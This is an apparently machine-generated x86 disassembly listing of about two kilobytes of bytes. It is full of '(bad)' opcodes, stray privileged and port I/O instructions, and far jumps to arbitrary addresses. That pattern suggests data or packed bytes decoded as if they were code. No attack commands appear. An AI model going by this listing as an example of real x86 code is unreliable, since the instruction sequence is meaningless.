  404040:	or     BYTE PTR [edi-0x4172ad19],ch
  404046:	stos   BYTE PTR es:[edi],al
  404047:	fwait
  404048:	pop    edi
  404049:	xchg   dl,dl
  40404b:	or     ch,dl
  40404d:	and    ebx,DWORD PTR [edx]
  40404f:	repz scas al,BYTE PTR es:[edi]
  404051:	xchg   ecx,eax
  404052:	xchg   esi,eax
  404053:	call   0x9cdf683e
  404058:	xchg   edi,eax
  404059:	popf   
  40405a:	xor    eax,0xde31cd41
  40405f:	mov    eax,ds:0x430dcacc
  404064:	(bad)  
  404065:	jno    0x40409d
  404067:	push   0x68c036c0
  40406c:	mov    eax,0xa2abbad
  404071:	lods   al,BYTE PTR ds:[esi]
  404072:	jne    0x4040d7
  404074:	adc    eax,0x95353a4a
  404079:	retf   
  40407a:	xchg   edx,edi
  40407c:	adc    esp,DWORD PTR [ebp+0x41]
  40407f:	xlat   BYTE PTR ds:[ebx]
  404080:	sbb    eax,ecx
  404082:	adc    dl,ch
  404084:	(bad)  
  404085:	mov    ebp,0x9be7a4ca
  40408a:	fbld   TBYTE PTR [ecx]
  40408c:	pop    ecx
  40408d:	(bad)  
  40408e:	or     edi,ebp
  404090:	sub    edx,DWORD PTR ds:[ebx]
  404093:	cmp    dl,ah
  404095:	repnz push ss
  404097:	test   BYTE PTR [edx+0x5b],ah
  40409a:	xchg   ebx,eax
  40409b:	jecxz  0x40404c
  40409d:	dec    ebp
  40409e:	jmp    0x5ddd4d61
  4040a3:	enter  0x6324,0xb7
  4040a7:	outs   dx,DWORD PTR ds:[esi]
  4040a8:	adc    bl,bh
  4040aa:	in     al,dx
  4040ab:	sub    BYTE PTR [ebx],ch
  4040ad:	pop    esp
  4040ae:	aad    0xab
  4040b0:	stos   BYTE PTR es:[edi],al
  4040b1:	loop   0x4040d0
  4040b3:	xchg   bl,bh
  4040b5:	inc    esp
  4040b6:	aas    
  4040b7:	xchg   ebp,eax
  4040b8:	mov    ecx,0xcd135c0b
  4040bd:	mov    esi,0x1883b02c
  4040c2:	daa    
  4040c3:	mov    ds:0x586da49c,eax
  4040c8:	inc    esp
  4040c9:	jo     0x4040c7
  4040cb:	mov    edi,0xf139faad
  4040d0:	mov    ah,0x6b
  4040d2:	mov    esi,0x40a8c75e
  4040d7:	mov    al,0x71
  4040d9:	mov    ch,0xde
  4040db:	mov    dl,0xc5
  4040dd:	outs   dx,BYTE PTR ds:[esi]
  4040de:	pop    ebp
  4040df:	cli    
  4040e0:	cmp    eax,ebp
  4040e2:	push   es
  4040e3:	xchg   BYTE PTR [esi+0x3710a9e1],cl
  4040e9:	and    BYTE PTR [eax+0x55],bh
  4040ec:	loop   0x4040a2
  4040ee:	int    0xe0
  4040f0:	shl    BYTE PTR [ecx+eiz*4+0x13],0x84
  4040f5:	lods   eax,DWORD PTR ds:[esi]
  4040f6:	xchg   esp,eax
  4040f7:	in     al,0x4f
  4040f9:	iret   
  4040fa:	ret    0x8eb1
  4040fd:	jl     0x404104
  4040ff:	ja     0x4040cd
  404101:	adc    bl,ch
  404103:	add    ch,ah
  404105:	imul   eax,DWORD PTR [edi+0x52214dee],0xffffff81
  40410c:	and    ch,BYTE PTR [edx+ebp*8]
  40410f:	(bad)  
  404112:	outs   dx,DWORD PTR ds:[esi]
  404113:	(bad)  
  404114:	cld    
  404115:	(bad)  
  404116:	(bad)  
  404117:	stos   DWORD PTR es:[di],eax
  404119:	sub    edx,DWORD PTR ds:0x19158686
  40411f:	mov    ebp,0xba1ddcbc
  404124:	cmp    al,0x2a
  404126:	stos   BYTE PTR es:[edi],al
  404127:	ins    BYTE PTR es:[edi],dx
  404128:	ret    0x21d8
  40412b:	mov    esp,DWORD PTR ds:0xbcadce9
  404131:	adc    DWORD PTR [edx-0x25],ebp
  404134:	inc    esp
  404135:	or     dh,BYTE PTR [ecx+0x6c53eb5b]
  40413b:	xchg   dl,ah
  40413d:	xlat   BYTE PTR ds:[ebx]
  40413e:	nop
  40413f:	shl    DWORD PTR [ecx-0x7e51fb13],1
  404145:	inc    edi
  404146:	fs jne 0x40411e
  404149:	fsubr  QWORD PTR [esi]
  40414b:	jne    0x4040e3
  40414d:	lock test eax,0xa9367b21
  404153:	out    0x75,eax
  404155:	loope  0x4041ab
  404157:	mov    esi,0xc3fce67b
  40415c:	cdq    
  40415d:	mov    eax,0x3e5132a0
  404162:	in     eax,dx
  404163:	cmp    ah,BYTE PTR [eax]
  404165:	aas    
  404166:	mov    DWORD PTR [ecx],eax
  404168:	xchg   edx,eax
  404169:	jo     0x404105
  40416b:	mov    al,fs:0xa65c668
  404171:	scas   eax,DWORD PTR es:[edi]
  404172:	pop    esp
  404173:	fsubr  DWORD PTR [ecx-0x385ab70]
  404179:	test   al,0x52
  40417b:	stos   DWORD PTR es:[edi],eax
  40417c:	mov    ebx,0xd1285f01
  404181:	push   ecx
  404182:	imul   ecx
  404184:	push   esp
  404185:	inc    esi
  404186:	cmp    DWORD PTR [edx-0x29b82502],edx
  40418c:	mov    DWORD PTR ds:0x4f383aba,ecx
  404192:	and    bl,BYTE PTR [edi+0x2ea62deb]
  404198:	out    dx,eax
  404199:	xor    edx,esp
  40419b:	mov    esp,0x2c564996
  4041a0:	jg     0x404182
  4041a2:	outs   dx,BYTE PTR ds:[esi]
  4041a3:	in     al,0x81
  4041a5:	retf   
  4041a6:	dec    esi
  4041a7:	call   0x1872:0x85d6f8e
  4041ae:	ss pop ecx
  4041b0:	in     al,dx
  4041b1:	pusha  
  4041b2:	xchg   BYTE PTR [ebp-0x3b],ch
  4041b5:	pushf  
  4041b6:	into   
  4041b7:	push   edx
  4041b8:	xor    eax,0x48cd2bb1
  4041bd:	aaa    
  4041be:	inc    eax
  4041bf:	fcmovbe st,st(4)
  4041c1:	push   0x59
  4041c3:	sbb    BYTE PTR es:[eax],cl
  4041c6:	sbb    ecx,DWORD PTR [ebx]
  4041c8:	jmp    0xb8dcb3d5
  4041cd:	mov    edx,0xd0e32825
  4041d2:	push   0xb8a20fc0
  4041d7:	and    eax,DWORD PTR [ecx+0x77]
  4041da:	pop    ds
  4041db:	shl    DWORD PTR [esi-0x43840fbf],0xd7
  4041e2:	(bad)  
  4041e3:	sbb    DWORD PTR [edi+0x26],ebx
  4041e6:	pop    ecx
  4041e7:	imul   esp,edx,0xffffffb3
  4041ea:	not    BYTE PTR ds:0x5101b0d3
  4041f0:	or     esi,DWORD PTR [esi+edi*2+0x50]
  4041f4:	push   0x5f9583c7
  4041f9:	into   
  4041fa:	adc    BYTE PTR [edx],bl
  4041fc:	dec    edi
  4041fd:	sbb    eax,0x29b99aab
  404202:	(bad)  
  404203:	adc    ecx,DWORD PTR [eax+0x2919ab1a]
  404209:	push   esi
  40420a:	arpl   WORD PTR [edi-0x62],dx
  40420d:	or     DWORD PTR [ecx],ebx
  40420f:	mov    ebp,0x5b1801d5
  404214:	scas   eax,DWORD PTR es:[edi]
  404215:	mov    dh,0xd1
  404217:	test   eax,0x3d5903e8
  40421c:	popf   
  40421d:	xchg   DWORD PTR [eax-0x1b5929ac],edx
  404223:	adc    BYTE PTR [ebp+0x50],dh
  404226:	aam    0xe4
  404228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404229:	fnstcw WORD PTR [esi-0x4f]
  40422c:	enter  0x7e01,0x45
  404230:	das    
  404231:	int    0xf4
  404233:	shl    BYTE PTR [ebx-0x2cddee59],0x31
  40423a:	jmp    0x70b5:0xc6968a06
  404241:	out    0xe0,eax
  404243:	sub    dl,BYTE PTR ss:[ebx+0x23001820]
  40424a:	sbb    ebp,DWORD PTR [edi-0x44]
  40424d:	inc    eax
  40424e:	cmp    ebx,DWORD PTR [ecx+esi*2+0x7ea14665]
  404255:	mov    esi,ebx
  404257:	sbb    eax,DWORD PTR [eax+0x14]
  40425a:	repnz pushf 
  40425c:	mov    ecx,0xa35c4cb9
  404261:	pop    ebx
  404262:	enter  0xce24,0x6b
  404266:	xchg   ecx,eax
  404267:	les    ebx,FWORD PTR [ecx]
  404269:	or     eax,0x48b28a47
  40426e:	js     0x404274
  404270:	add    eax,0x9be61dff
  404275:	lock xchg ecx,eax
  404277:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404278:	sub    dh,ah
  40427a:	inc    ebp
  40427b:	push   ss
  40427c:	or     eax,0x1f14137e
  404281:	btr    DWORD PTR [eax-0x2d],0xb7
  404286:	pop    es
  404287:	cmc    
  404288:	out    0x90,al
  40428a:	(bad)  
  40428b:	push   cs
  40428c:	mov    eax,DWORD PTR [edx+0x7c5c80a1]
  404292:	ret    
  404293:	lds    ebx,FWORD PTR [edx-0x5a36a70b]
  404299:	or     eax,0x58f5c300
  40429e:	mov    ebx,0xf5afd4bc
  4042a3:	mov    cl,dh
  4042a5:	cwde   
  4042a6:	in     eax,dx
  4042a7:	leave  
  4042a8:	mov    cl,0x4d
  4042aa:	or     eax,0xa16cbd14
  4042af:	or     esp,ebp
  4042b1:	shrd   DWORD PTR [eax-0x436f1f52],ebx,0xa2
  4042b9:	idiv   BYTE PTR [ecx]
  4042bb:	adc    bl,BYTE PTR [esi]
  4042bd:	pushf  
  4042be:	jno    0x404335
  4042c0:	push   edi
  4042c1:	xchg   BYTE PTR [edi+0x46],ah
  4042c4:	aam    0xb4
  4042c6:	mov    ds:0xf29eabab,al
  4042cb:	pop    eax
  4042cc:	not    bh
  4042ce:	repz mov bl,0x3f
  4042d1:	scas   eax,DWORD PTR es:[edi]
  4042d2:	push   edi
  4042d3:	test   al,0x53
  4042d5:	aaa    
  4042d6:	outs   dx,DWORD PTR ds:[esi]
  4042d7:	inc    edx
  4042d8:	sub    eax,0x72fc44f
  4042dd:	cdq    
  4042de:	aas    
  4042df:	dec    esp
  4042e0:	rcl    DWORD PTR [esi-0x1a],1
  4042e3:	mov    dh,0x18
  4042e5:	push   0x5523e6be
  4042ea:	addr16 and eax,0xb18538a9
  4042f0:	es sbb eax,0x6c66b53a
  4042f6:	dec    esp
  4042f7:	inc    ecx
  4042f8:	in     al,dx
  4042f9:	or     ah,BYTE PTR [ebp+0x77]
  4042fc:	dec    edi
  4042fd:	mov    dh,0x5e
  4042ff:	int3   
  404300:	inc    ecx
  404301:	loopne 0x404369
  404303:	les    eax,FWORD PTR [ecx-0x307c3d9e]
  404309:	xchg   DWORD PTR [edi-0x59],edx
  40430c:	lods   eax,DWORD PTR ds:[esi]
  40430d:	mov    ?,ebx
  40430f:	jnp    0x4042df
  404311:	mov    ch,0xcc
  404313:	jl     0x40430f
  404315:	or     ebp,DWORD PTR [edx]
  404317:	sub    ch,BYTE PTR [ebx+edx*2]
  40431a:	fsub   st,st(5)
  40431c:	inc    ebp
  40431d:	data16 add al,bl
  404320:	xor    cl,al
  404322:	mov    ebx,0x6d60466a
  404327:	mov    BYTE PTR [edx+0x1f],al
  40432a:	pop    ebx
  40432b:	xor    al,BYTE PTR [ebp+0x57b315b8]
  404331:	push   ecx
  404332:	sub    esi,DWORD PTR [edi+ebx*8]
  404335:	scas   eax,DWORD PTR es:[edi]
  404336:	scas   al,BYTE PTR es:[edi]
  404337:	jmp    0xf7ac:0x295de015
  40433e:	fsub   QWORD PTR [ebx+0x7a]
  404341:	repz leave 
  404343:	fmul   QWORD PTR [esi+0x39e22019]
  404349:	or     al,0x45
  40434b:	adc    BYTE PTR [esi+0x77],cl
  40434e:	fdivr  QWORD PTR [esi]
  404350:	loopne 0x40437c
  404352:	aad    0xe0
  404354:	xor    al,0x3a
  404356:	es and al,0x22
  404359:	sub    BYTE PTR [edx-0x7c],cl
  40435c:	mov    esi,0x145a404a
  404361:	mov    dl,BYTE PTR [esi]
  404363:	in     al,0xf2
  404365:	pop    ecx
  404366:	in     eax,dx
  404367:	rol    BYTE PTR [ebx-0x60],cl
  40436a:	xchg   ebp,eax
  40436b:	xor    DWORD PTR [edi-0x3cbfbd8],ecx
  404371:	mov    al,ds:0xfa53ebee
  404376:	xchg   edi,eax
  404377:	lods   eax,DWORD PTR ds:[esi]
  404378:	jmp    0xbd5edacd
  40437d:	mov    bl,0xad
  40437f:	pop    ebp
  404380:	enter  0x7bea,0xd3
  404384:	mov    al,0x26
  404386:	mov    ebx,DWORD PTR [ebp+ecx*1+0x6a]
  40438a:	add    DWORD PTR [esi],eax
  40438c:	or     esp,ebx
  40438e:	js     0x40433c
  404390:	add    al,0x3c
  404392:	js     0x404393
  404394:	push   0xffffffb5
  404396:	out    dx,al
  404397:	xchg   esp,eax
  404398:	daa    
  404399:	pop    es
  40439a:	inc    ecx
  40439b:	outs   dx,DWORD PTR es:[esi]
  40439d:	push   edx
  40439e:	sti    
  40439f:	ss jmp 0x9946:0xe82607bd
  4043a7:	xor    bh,BYTE PTR [edi]
  4043a9:	adc    DWORD PTR [ebx-0x14],ecx
  4043ac:	stos   DWORD PTR es:[edi],eax
  4043ad:	std    
  4043ae:	adc    al,0xdd
  4043b0:	call   0x5a51:0x9921770e
  4043b7:	imul   esp,DWORD PTR [ecx+ebp*2-0x2d02b84b],0x15
  4043bf:	dec    ebp
  4043c0:	imul   edx,DWORD PTR [eax],0xa12ba375
  4043c6:	int3   
  4043c7:	lahf   
  4043c8:	call   0x5777:0xda8e33b8
  4043cf:	shl    DWORD PTR [eax],cl
  4043d1:	jne    0x4043d3
  4043d3:	popa   
  4043d4:	mov    bh,0xd1
  4043d6:	outs   dx,BYTE PTR ds:[esi]
  4043d7:	jge    0x404392
  4043d9:	pop    esi
  4043da:	aaa    
  4043db:	fcom   st(4)
  4043dd:	aaa    
  4043de:	inc    ebp
  4043df:	jmp    0x404382
  4043e1:	lock cmp edx,DWORD PTR [edx]
  4043e4:	jns    0x4043a1
  4043e6:	enter  0x5951,0xd9
  4043ea:	jbe    0x40443b
  4043ec:	ds jle 0x4043ee
  4043ef:	cmp    eax,0x3909f40b
  4043f4:	push   ss
  4043f5:	sti    
  4043f6:	dec    ebx
  4043f7:	stc    
  4043f8:	out    dx,eax
  4043f9:	lods   eax,DWORD PTR ds:[esi]
  4043fa:	or     ch,dl
  4043fc:	dec    edx
  4043fd:	int3   
  4043fe:	icebp  
  4043ff:	das    
  404400:	aad    0xdd
  404402:	fcomip st,st(7)
  404404:	icebp  
  404405:	mov    al,0x54
  404407:	(bad)  
  404408:	sahf   
  404409:	and    eax,ecx
  40440b:	inc    esp
  40440c:	pop    ss
  40440d:	xor    ah,bl
  40440f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404410:	sub    ah,BYTE PTR [edx+0x2f4365d7]
  404416:	jecxz  0x404463
  404418:	dec    eax
  404419:	pop    ds
  40441a:	jo     0x40444c
  40441c:	cmp    al,0xd
  40441e:	xor    eax,DWORD PTR [edx]
  404420:	mov    ah,0x5
  404422:	std    
  404423:	mov    ecx,0x504b851e
  404428:	or     eax,0x641fab6a
  40442d:	jbe    0x40447a
  40442f:	mov    dl,0x3a
  404431:	pop    edi
  404432:	mov    esi,0x4958f208
  404437:	das    
  404438:	sbb    bl,al
  40443a:	sub    DWORD PTR [ebx-0xcae863f],ebp
  404440:	and    al,bl
  404442:	fsubr  st,st(6)
  404444:	push   edi
  404445:	mov    DWORD PTR [eax+0x1f],ecx
  404448:	jmp    0x4e74:0xdbd5fa4a
  40444f:	sbb    al,0x94
  404451:	sbb    dh,BYTE PTR [ecx+0xd]
  404454:	sub    DWORD PTR [esi+0x19],ebp
  404457:	lahf   
  404458:	aaa    
  404459:	aaa    
  40445a:	sub    al,0x5b
  40445c:	push   cs
  40445d:	push   eax
  40445e:	mov    ebp,0x5760e5f1
  404463:	add    edx,DWORD PTR [esi+ecx*1]
  404466:	or     DWORD PTR [eax],ecx
  404468:	mov    edx,0x3ce11587
  40446d:	push   eax
  40446e:	(bad)  
  404470:	ss aad 0xb2
  404473:	leave  
  404474:	mov    cl,0xa3
  404476:	test   al,0xf5
  404478:	push   edi
  404479:	mov    bl,0xb3
  40447b:	ja     0x4044dc
  40447d:	jb     0x40444d
  40447f:	fs mov cl,0x54
  404482:	les    edi,FWORD PTR [ecx-0x56]
  404485:	mov    ch,0xbc
  404487:	icebp  
  404488:	bound  esi,QWORD PTR [eax+ebp*4+0xf]
  40448c:	push   esi
  40448d:	mov    eax,ds:0x8fae7f60
  404492:	and    DWORD PTR [ebx+eiz*8],edi
  404495:	test   eax,0x86ff56a3
  40449a:	(bad)  
  40449c:	jmp    0xe041:0xbe7eb9c7
  4044a3:	sbb    DWORD PTR [ecx+0x43],0x2fcd1c29
  4044aa:	jne    0x404444
  4044ac:	int    0xb4
  4044ae:	or     eax,0xd6610096
  4044b3:	jg     0x404491
  4044b5:	pop    ebp
  4044b6:	cli    
  4044b7:	shr    BYTE PTR [ecx],cl
  4044b9:	jo     0x4044fc
  4044bb:	es std 
  4044bd:	mov    edx,0x5d0594f0
  4044c2:	cmp    DWORD PTR [edx],0xc8d10076
  4044c8:	mov    DWORD PTR [eax],edx
  4044ca:	fsubr  DWORD PTR [eax-0x4d]
  4044cd:	push   es
  4044ce:	fcmovb st,st(4)
  4044d0:	imul   ecx,DWORD PTR [esp+esi*8]
  4044d4:	adc    eax,0xef81ea5a
  4044d9:	sbb    bl,BYTE PTR [esi+0x72]
  4044dc:	xchg   bh,dh
  4044de:	stos   BYTE PTR es:[edi],al
  4044df:	mov    eax,DWORD PTR [esi]
  4044e1:	or     BYTE PTR [edx+ebx*4],dh
  4044e4:	sti    
  4044e5:	pop    ecx
  4044e6:	scas   al,BYTE PTR es:[edi]
  4044e7:	std    
  4044e8:	out    0xd5,al
  4044ea:	xor    dh,0x7b
  4044ed:	xchg   ebp,eax
  4044ee:	js     0x404512
  4044f0:	inc    eax
  4044f1:	adc    cl,BYTE PTR [edx+edx*8]
  4044f4:	lods   eax,DWORD PTR ds:[esi]
  4044f5:	mov    ds:0x8e57134,al
  4044fa:	and    ebx,DWORD PTR [esi+ebx*4+0x1dbf27f]
  404501:	(bad)  
  404502:	into   
  404503:	sub    ah,BYTE PTR [ecx-0x32]
  404506:	lahf   
  404507:	loope  0x40452c
  404509:	je     0x404525
  40450b:	sbb    ecx,DWORD PTR [eax]
  40450d:	daa    
  40450e:	push   edx
  40450f:	cmp    dh,BYTE PTR [esi+0x7ffc3e88]
  404515:	push   ebp
  404516:	jb     0x404542
  404518:	pop    edx
  404519:	jns    0x40451d
  40451b:	add    esp,esi
  40451d:	fwait
  40451e:	push   ecx
  40451f:	ds jecxz 0x404530
  404522:	pop    ebx
  404523:	jg     0x404504
  404525:	not    DWORD PTR [ebp+0x7e627e9b]
  40452b:	mov    WORD PTR [ebx],cs
  40452d:	mov    bh,0xe6
  40452f:	add    al,0xeb
  404531:	lods   eax,DWORD PTR ds:[esi]
  404532:	sub    dh,cl
  404534:	xchg   BYTE PTR [esi],cl
  404536:	xchg   ebx,eax
  404537:	leave  
  404538:	sbb    DWORD PTR [edi+0x1],edi
  40453b:	out    0xff,al
  40453d:	int    0xca
  40453f:	push   0x4cea9a18
  404544:	ss cmc 
  404546:	or     dl,BYTE PTR [edi-0x76469ab3]
  40454c:	add    eax,0x341ec9bd
  404551:	cmp    al,bl
  404553:	xlat   BYTE PTR ds:[ebx]
  404554:	out    0x40,al
  404556:	ins    BYTE PTR es:[edi],dx
  404557:	repnz add bl,ah
  40455a:	cmp    dh,BYTE PTR [ebx+0x50]
  40455d:	cdq    
  40455e:	shr    DWORD PTR [eax-0x3d7ddcd9],0x11
  404565:	out    0x32,al
  404567:	mov    cl,0x87
  404569:	mov    ecx,0xdc7636ac
  40456e:	and    eax,0x70bb6ba1
  404573:	call   0x4d12:0xf618ba01
  40457a:	sbb    al,0x8
  40457c:	xchg   ebp,eax
  40457d:	xor    eax,0xf4ca37bd
  404582:	push   eax
  404583:	or     eax,0x6e66d3fc
  404588:	iret   
  404589:	pop    esp
  40458a:	mov    cl,0xcf
  40458c:	pop    esp
  40458d:	pushf  
  40458e:	aam    0xa8
  404590:	arpl   WORD PTR [ebx],ax
  404592:	or     al,0x41
  404594:	nop
  404595:	bound  ebp,QWORD PTR [edi+0x13c4a10e]
  40459b:	out    dx,al
  40459c:	fisub  DWORD PTR [ebx+0x47765aef]
  4045a2:	das    
  4045a3:	arpl   WORD PTR [edx+0x54],di
  4045a6:	adc    DWORD PTR [ecx+0x1755dd91],esp
  4045ac:	mov    edx,0x84c6f561
  4045b1:	sub    DWORD PTR [edx-0x6ec13ea0],edx
  4045b7:	inc    ecx
  4045b8:	xchg   edx,eax
  4045b9:	and    DWORD PTR [ebx-0x3d],edi
  4045bc:	mov    esp,fs
  4045be:	jge    0x4045b1
  4045c0:	jg     0x40463e
  4045c2:	popf   
  4045c3:	mov    ds:0xeef4aed0,eax
  4045c8:	icebp  
  4045c9:	(bad)  [ebx+0x7c642524]
  4045cf:	sbb    BYTE PTR [edx+0x22],dh
  4045d2:	sub    dl,BYTE PTR [ecx]
  4045d4:	or     DWORD PTR [ebx-0x1b],esi
  4045d7:	push   0x16
  4045d9:	in     al,0xde
  4045db:	dec    ebp
  4045dc:	dec    ebp
  4045dd:	mov    eax,0x42f2a9ff
  4045e2:	out    dx,eax
  4045e3:	rcl    DWORD PTR [edi-0x5d],0x9c
  4045e7:	or     DWORD PTR [ebx-0x6ef4b639],ebx
  4045ed:	ja     0x40460b
  4045ef:	xlat   BYTE PTR ds:[ebx]
  4045f0:	cmp    eax,0x8b07fbeb
  4045f5:	xchg   ebp,eax
  4045f6:	mov    ebx,0x7d53e181
  4045fb:	cdq    
  4045fc:	fisubr DWORD PTR [ebp+0x28]
  4045ff:	je     0x404606
  404601:	push   edx
  404602:	loopne 0x4045cf
  404604:	or     ecx,DWORD PTR [ebp-0x32]
  404607:	jg     0x40459c
  404609:	sbb    al,0x93
  40460b:	fwait
  40460c:	mov    bl,0xd1
  40460e:	cmp    esi,edi
  404610:	mov    ds:0xd410df64,eax
  404615:	scas   eax,DWORD PTR es:[edi]
  404616:	mov    edi,0xf5939bf4
  40461b:	dec    eax
  40461c:	gs std 
  40461e:	loopne 0x4045d0
  404620:	push   ecx
  404621:	stos   BYTE PTR es:[edi],al
  404622:	sub    eax,0x1faa967d
  404627:	pushf  
  404628:	mov    cl,0xc4
  40462a:	jg     0x40469b
  40462c:	dec    ecx
  40462d:	inc    ebp
  40462e:	push   edx
  40462f:	addr16 mov edi,0xaab2be4f
  404635:	mov    ds:0xd5d9728d,eax
  40463a:	nop
  40463b:	into   
  40463c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40463d:	inc    ebx
  40463e:	dec    esp
  40463f:	xchg   esp,eax
  404640:	pushf  
  404641:	mov    al,ds:0xfd102a80
  404646:	sub    DWORD PTR [ecx],esi
  404648:	pop    ebp
  404649:	retf   0x83a4
  40464c:	mov    ch,0x24
  40464e:	(bad)
  404651:	sbb    cl,dh
  404653:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404654:	les    edi,FWORD PTR [ecx-0x78]
  404657:	(bad)  
  404658:	jbe    0x404688
  40465a:	push   ds
  40465b:	loopne 0x4046d8
  40465d:	add    bh,BYTE PTR [ebp+0x30038b87]
  404663:	cmp    eax,esi
  404665:	arpl   WORD PTR [eax],si
  404667:	rcr    DWORD PTR [ecx+0x7f],cl
  40466a:	loope  0x40463b
  40466c:	mov    ?,WORD PTR [edx]
  40466e:	aas    
  40466f:	rcl    BYTE PTR [edx-0x1a325163],cl
  404675:	pop    edx
  404676:	fbstp  TBYTE PTR [ebx-0x89bb99f]
  40467c:	popf   
  40467d:	ins    DWORD PTR es:[edi],dx
  40467e:	test   eax,0x3abe4e73
  404683:	cmp    DWORD PTR [edx+edx*8-0xb],edx
  404687:	dec    ebx
  404688:	mov    dh,BYTE PTR [ecx]
  40468a:	xor    BYTE PTR [ebp+eax*1-0x4288276e],0xac
  404692:	cmp    dh,BYTE PTR [edx]
  404694:	addr16 (bad) 
  404696:	cmp    esp,DWORD PTR [edi+0x24cf09bf]
  40469c:	mov    dl,BYTE PTR [ebx-0x26]
  40469f:	dec    eax
  4046a0:	dec    edi
  4046a1:	test   BYTE PTR [edx+edx*8-0x61],ah
  4046a5:	sub    al,0x7
  4046a7:	lock loop 0x4046b6
  4046aa:	leave  
  4046ab:	ja     0x4046a1
  4046ad:	in     al,dx
  4046ae:	in     al,0x9b
  4046b0:	mov    BYTE PTR [eax],bl
  4046b2:	ins    DWORD PTR es:[edi],dx
  4046b3:	out    dx,eax
  4046b4:	lods   eax,DWORD PTR ds:[esi]
  4046b5:	mov    BYTE PTR [ebp+0x56],ch
  4046b8:	scas   eax,DWORD PTR es:[edi]
  4046b9:	loopne 0x4046af
  4046bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046bc:	mov    ecx,0xcf263ee2
  4046c1:	inc    ebx
  4046c2:	mov    ecx,0x4e4c00f6
  4046c7:	push   0xb37f17ec
  4046cc:	test   al,0xe0
  4046ce:	add    ebx,DWORD PTR [ecx-0x37]
  4046d1:	fcom   DWORD PTR [eax+0x54]
  4046d4:	lahf   
  4046d5:	push   esi
  4046d6:	scas   eax,DWORD PTR es:[edi]
  4046d7:	out    0x8,al
  4046d9:	pop    ss
  4046da:	imul   edi,DWORD PTR [eax],0xbc107fa9
  4046e0:	cmp    BYTE PTR [esi+edx*4+0x64381252],cl
  4046e7:	test   eax,0x425b00bb
  4046ec:	sbb    eax,0xadf7b041
  4046f1:	shl    BYTE PTR [edi-0x7e],0xa6
  4046f5:	dec    edx
  4046f6:	cmp    eax,0xd720deb8
  4046fb:	int3   
  4046fc:	(bad)  
  4046fd:	pop    ebp
  4046fe:	inc    ebx
  4046ff:	mov    edi,0x3ff1ca14
  404704:	dec    esi
  404705:	(bad)  
  404706:	fisub  WORD PTR [eax+0x1726af90]
  40470c:	mov    ebp,0x9c484b4e
  404711:	jecxz  0x40473d
  404713:	fstp   TBYTE PTR [eax]
  404715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404716:	sbb    ecx,DWORD PTR [edx+ecx*4-0x581fb7b4]
  40471d:	mov    bl,0x20
  40471f:	push   0x41
  404721:	fcomp  DWORD PTR [ecx]
  404723:	xchg   ebx,eax
  404724:	sub    ebp,DWORD PTR [edx-0x80e1449]
  40472a:	pop    DWORD PTR [eax+0x14fce808]
  404730:	add    edi,DWORD PTR [eax+0x1ece79fc]
  404736:	enter  0x83cf,0x2c
  40473a:	jmp    0x3b3c:0xa6390ff7
  404741:	lea    edi,[ebx-0x11]
  404744:	push   DWORD PTR [ecx-0x3d]
  404747:	push   ebx
  404748:	and    DWORD PTR [ecx+0x5d276cb5],0x92a8eea5
  404752:	add    esi,DWORD PTR [edi+0x69]
  404755:	fist   DWORD PTR [esi]
  404757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404758:	fldcw  WORD PTR [ebx]
  40475a:	(bad)  
  40475d:	jg     0x4047c0
  40475f:	mov    edx,0x60b81f05
  404764:	inc    esp
  404765:	add    al,0x7
  404767:	pop    esp
  404768:	stos   DWORD PTR es:[edi],eax
  404769:	or     BYTE PTR [ebp-0x3df11664],ch
  40476f:	clc    
  404770:	mov    bh,0xd6
  404772:	rcl    DWORD PTR [edi],0x57
  404775:	or     DWORD PTR [esi+0x71],edx
  404778:	jo     0x4047ec
  40477a:	push   0xff048c87
  40477f:	(bad)  
  404780:	mov    cl,cl
  404782:	push   ss
  404783:	xchg   esi,eax
  404784:	and    BYTE PTR [esi],cl
  404786:	ror    BYTE PTR [esi+0x7],cl
  404789:	pop    ebx
  40478a:	ja     0x404738
  40478c:	mov    esi,0x9422d702
  404792:	pop    edi
  404793:	popf   
  404794:	(bad)  
  404795:	mov    DWORD PTR [eax-0x575b69e0],edx
  40479b:	mov    bh,0x9f
  40479d:	cmp    ebp,DWORD PTR ds:0x88435ddf
  4047a3:	cld    
  4047a4:	xchg   BYTE PTR [ebx+0x39],cl
  4047a7:	nop
  4047a8:	dec    ebx
  4047a9:	adc    BYTE PTR [eax-0x39],dl
  4047ac:	lahf   
  4047ad:	jecxz  0x404769
  4047af:	mov    ds:0x84b2cd42,al
  4047b4:	loopne 0x40476d
  4047b6:	neg    dh
  4047b8:	cmc    
  4047b9:	imul   esp,ecx,0x29259526
  4047bf:	popf   
  4047c0:	addr16 iret 
  4047c2:	adc    eax,0x6f6c441e
  4047c7:	jmp    0x7b0a04e3
  4047cc:	push   edi
  4047cd:	outs   dx,DWORD PTR ds:[esi]
  4047ce:	mov    esp,0x6a96d0d2
  4047d3:	outs   dx,DWORD PTR ds:[esi]
  4047d4:	xchg   ebx,eax
  4047d5:	sbb    al,bl
  4047d7:	cmp    ecx,esi
  4047d9:	test   al,0xda
  4047db:	jecxz  0x4047fa
  4047dd:	mov    esi,0x3d8a173b
  4047e2:	mov    edx,0x3b7741c2
  4047e7:	xchg   ecx,eax
  4047e8:	mov    BYTE PTR [ecx+0x4ea25c03],al
  4047ee:	repnz aas 
  4047f0:	in     al,0x3
  4047f2:	adc    al,0xf3
  4047f4:	adc    al,BYTE PTR [ebx-0x45f4b785]
  4047fa:	push   cs
  4047fb:	cld    
  4047fc:	add    ch,ah
  4047fe:	lea    ecx,[edi+0x64b32def]
  404804:	jnp    0x404839
  404806:	fiadd  WORD PTR [ebp-0x790dacb]
  40480c:	sti    
  40480d:	lods   eax,DWORD PTR ds:[esi]
  40480e:	ja     0x404859
  404810:	and    DWORD PTR [edi],0xeee0764e
  404816:	xchg   sp,ax
  404818:	xlat   BYTE PTR ds:[ebx]
  404819:	test   DWORD PTR [esi],edx
  40481b:	leave  
  40481c:	in     al,0x7b
  40481e:	fiadd  WORD PTR [ebx+0x3f]
  404821:	enter  0xec4e,0x9b
  404825:	aas    
  404826:	aaa    
  404827:	cmp    esi,DWORD PTR [edi+0x3307e572]
